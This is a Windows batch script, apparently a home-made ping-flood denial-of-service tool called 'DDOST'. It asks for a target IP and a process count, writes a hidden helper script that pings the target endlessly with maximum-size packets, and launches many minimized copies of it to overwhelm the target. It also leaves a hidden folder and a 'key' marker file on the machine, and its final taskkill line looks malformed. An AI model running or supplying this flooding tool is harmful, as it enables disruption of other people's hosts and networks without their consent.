@echo off

if exist %userprofile%\key goto skip
  cls
  echo verifiedbypass>>%userprofile%\key
  md %temp%\DDOST\
  md %userprofile%\.ddost\
  md %userprofile%\.ddost\data\
  attrib +h %temp%\DDOST\

:skip
  echo IP:
  set /p ip=
    cls
      echo Amount of process tasks:
  set /p windows=
    cls
      echo ping %ip% -t -l 65500>>"%temp%\DDOST\run.bat"
  
for /l %%A in (1,1,%windows%) do start /min "cmd.exe" "%temp%\DDOST\run.bat"
echo Press any button to exit
  pause >nul
    del /q "%temp%\DDOST\run.bat"
    taskkill /im /f cmd.exe
